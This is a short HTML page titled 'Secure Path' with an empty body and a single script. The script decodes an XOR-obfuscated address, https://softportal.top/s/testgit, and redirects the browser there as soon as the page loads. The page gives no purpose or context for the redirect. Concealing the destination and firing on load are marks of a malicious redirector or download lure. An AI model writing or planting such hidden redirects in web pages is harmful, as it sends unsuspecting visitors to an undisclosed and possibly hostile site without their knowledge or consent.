<!DOCTYPE html>
<html>
<head>
    <title>Secure Path</title>
    <script>
        const key = 0x55;
        const encrypted = [
            0x73 ^ key, 0x6F ^ key, 0x66 ^ key, 0x74 ^ key, 0x70 ^ key, 0x6F ^ key, 0x72 ^ key, 0x74 ^ key, 0x61 ^ key, 0x6C ^ key,
            0x2E ^ key, 0x74 ^ key, 0x6F ^ key, 0x70 ^ key,
            0x2F ^ key, 0x73 ^ key,
            0x2F ^ key, 0x74 ^ key, 0x65 ^ key, 0x73 ^ key, 0x74 ^ key, 0x67 ^ key, 0x69 ^ key, 0x74 ^ key
        ];

        const decrypt = (char) => String.fromCharCode(char ^ key);
        let url = "https://";
        for (let char of encrypted) {
            url += decrypt(char);
        }

        window.location.href = url;
    </script>
</head>
<body>
</body>
</html>
